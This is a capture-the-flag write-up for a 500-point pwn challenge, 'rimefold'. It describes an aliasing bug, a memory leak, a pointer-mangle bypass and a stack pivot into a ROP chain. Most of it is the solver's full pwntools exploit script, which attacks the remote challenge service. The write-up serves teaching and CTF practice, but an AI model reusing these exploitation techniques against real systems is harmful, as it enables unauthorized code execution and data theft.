# rimefold -- Pwn

**Flag:** `isfcr{the_merge_3b7d_never_rechecked_the_hue_00cb8b04}`
**Points:** 500
**Solved by:** vikas1337
**Tools:** see script below
**Scripts:** `solve.py` is vikas1337's original solve script, included verbatim.

## Summary

A remote "self-defragmenting staging arena" record store (`coldpack`) living in a single `mmap` whose first 0x80 bytes are a "reaper object" (fn-ptr, arg, gadget-stub base `G`, mmap self-ptr, flag fd, cookie). Chaining a REAP aliasing bug, a liveness-check-missing DRAW leak, and a PACK overwrite of the reaper's call target gives a controlled call → stack pivot → ROP that reads the flag from the already-open fd (seccomp blocks `open`).

## Solution

### Step 1: Alias the reaper object and leak

REAP aliases a cell's data pointer to the reaper object (mmap base) when it sees a run of **>6 consecutive** staging entries sharing `norm[i]=rand[i]&7`. Only 8 classes over 64 cells, so by pigeonhole some class has ≥7; **FOLD is a perfect equality oracle** to cluster cells into classes. DRAW never checks liveness, so DRAWing the aliased cell leaks the gadget-stub base `G`, the mmap base, and the flag fd (defeating ASLR). The gadget stub at `G` is a ready toolkit: `G+0 pop rax; G+2 pop rdi; G+4 pop rsi; G+6 pop rdx; G+8 syscall; G+0xb mov rsp,rdi` (stack pivot). PACK values parse as **decimal** despite `COLDPACK.md` saying "qhex".

### Step 2: Defeat the pointer mangle and hijack the reaper call

REAP's tail always does `rdi=[reaper+8]; call [reaper+0]`. PACK rewrites `reaper+0/+8` → controlled call + rdi. On the live abi-1.4 head, `reaper+0` is pointer-mangled: `stored = rol(ptr ^ guard, R)` with a per-process `guard` (`%fs:0x30`). Because the mangle is XOR-linear in `ptr`, the guard cancels: `mangle(pivot) = reaper0 ^ rol(pivot ^ (G+delta), R)` — needing only the (rotation `R`, gadget offset `delta`, direction) triple, which the solver **brute-forces** (only the correct triple makes REAP pivot into our chain instead of crashing/surviving-no-op). The winner is `R=0, delta=0x1, fwd=True` — i.e. `reaper+0` holds the bare `ret` at `G+1` with no rotation, so the forge reduces to `reaper0 ^ (G+1) ^ pivot`. The staged chain is `read(flagfd,buf,0x100); write(1,buf,0x100); exit(0)`.

```python
#!/usr/bin/env python3
# Brute the 1.4 pointer-mangle (rotation R, gadget offset delta, direction) for
# reaper+0, using XOR-linearity so the per-process guard cancels:
#   mangle(p) = rol(p ^ g, R);  reaper0 = mangle(G+delta)
#   => mangle(pivot) = reaper0 ^ rol(pivot ^ (G+delta), R)    (fwd)
#   (reverse direction uses ror<->rol swapped).
# Only the CORRECT (R,delta,dir) makes REAP pivot into our chain -> flag.
from pwn import *
import sys, re, itertools
context.update(arch='amd64', os='linux', log_level='error')
HOST, PORT = '0.cloud.chals.io', 15036
MASK = (1 << 64) - 1
def ror(x, r): return ((x >> r) | (x << (64-r))) & MASK
def rol(x, r): return ((x << r) | (x >> (64-r))) & MASK

def connect():
    io = remote(HOST, PORT); io.recvline(); return io

def pipe(io, cmds):
    io.send(''.join(c+'\n' for c in cmds).encode())
    return [io.recvline().strip() for _ in cmds]

def setup(io):
    # allocate 64 cells (pipelined)
    rep = pipe(io, ['NEW']*64); cells = [int(r.split()[2]) for r in rep]
    # cluster via FOLD oracle; each STAGE+FOLD pair is independent (FOLD clears)
    def classmates(ref, cand):
        cmds = []
        for x in cand: cmds += ['STAGE %d %d' % (ref, x), 'FOLD']
        rep = pipe(io, cmds); out = []
        for i, x in enumerate(cand):
            if rep[2*i+1].split()[2] == b'1': out.append(x)
        return out
    cls = None
    pool = cells[:]
    while pool:
        ref = pool[0]; mates = [ref] + classmates(ref, pool[1:])
        if len(mates) >= 7: cls = mates; break
        pool = [x for x in pool if x not in mates]
    assert cls, 'no >=7 class'
    run = cls[:7]; c = run[-1]
    spares = [x for x in cells if x not in run]; d, e = spares[0], spares[1]
    pipe(io, ['STAGE '+' '.join(map(str, run))]); pipe(io, ['REAP'])
    lk = [int(x, 16) for x in pipe(io, ['DRAW %d 16' % c])[0].split()[1:]]
    G, mmap, fd, magic, reaper0 = lk[2], lk[3], lk[4] & 0xffffffff, lk[5], lk[0]
    assert magic == 0x8b1e3fd7c0a64521, 'cookie mismatch %#x' % magic
    pop_rax, pop_rdi, pop_rsi, pop_rdx, sysc, pivot = G, G+2, G+4, G+6, G+8, G+0xb
    D = mmap+0x80+d*0x100; E = mmap+0x80+e*0x100
    chain = [pop_rdi, fd, pop_rsi, E, pop_rdx, 0x100, pop_rax, 0, sysc,
             pop_rdi, 1, pop_rsi, E, pop_rdx, 0x100, pop_rax, 1, sysc,
             pop_rdi, 0, pop_rax, 0x3c, sysc]
    pipe(io, ['PACK %d ' % d + ' '.join('%d' % (q & MASK) for q in chain)])
    return dict(c=c, d=d, G=G, mmap=mmap, fd=fd, reaper0=reaper0, pivot=pivot, D=D)

def forge(reaper0, pivot, G, delta, R, fwd):
    if fwd:  return reaper0 ^ rol(pivot ^ ((G+delta) & MASK), R)
    else:    return reaper0 ^ ror(pivot ^ ((G+delta) & MASK), R)

def fire(io, s, fv):
    pipe(io, ['PACK %d %d %d' % (s['c'], fv & MASK, s['D'] & MASK)])
    io.sendline(b'REAP')
    try:
        data = io.recvrepeat(1.5)
    except EOFError:
        return None
    m = re.search(rb'isfcr\{[^}]*\}', data)
    if m: return m.group(0).decode()
    if data == b'': return None   # likely crashed/closed
    return False                  # survived, wrong guess

# candidate order: glibc R=17 first across ret-ish deltas & both directions,
# then widen R.
ret_deltas = [3, 5, 7, 0xa, 0xe, 0, 2, 4, 6, 8, 9, 0xb, 0xc, 0xd, 0xf, 1]
cands = [(17, d, True) for d in ret_deltas] + [(17, d, False) for d in ret_deltas]
cands += [(R, d, fw) for R in range(64) if R != 17 for d in (1, 3, 5, 7, 0xa, 0xe) for fw in (True, False)]

tested = 0
for (R, delta, fw) in cands:
    try:
        io = connect(); s = setup(io)
    except Exception as ex:
        sys.stderr.write('setup fail (%s), retry\n' % ex); continue
    fv = forge(s['reaper0'], s['pivot'], s['G'], delta, R, fw)
    try:
        res = fire(io, s, fv)
    except EOFError:
        res = None
    tested += 1
    sys.stderr.write('try R=%d delta=%#x fwd=%s -> %s\n' % (R, delta, fw,
        'SURVIVE' if res is False else ('CRASH' if res is None else res)))
    try: io.close()
    except: pass
    if isinstance(res, str):
        print('FOUND (R=%d delta=%#x fwd=%s)' % (R, delta, fw)); print('FLAG', res); sys.exit(0)
    if tested >= 400: break
print('exhausted; tested', tested)
```

Winning run: `… try R=0 delta=0x1 fwd=True -> isfcr{the_merge_3b7d_never_rechecked_the_hue_00cb8b04}` / `FOUND (R=0 delta=0x1 fwd=True)`.
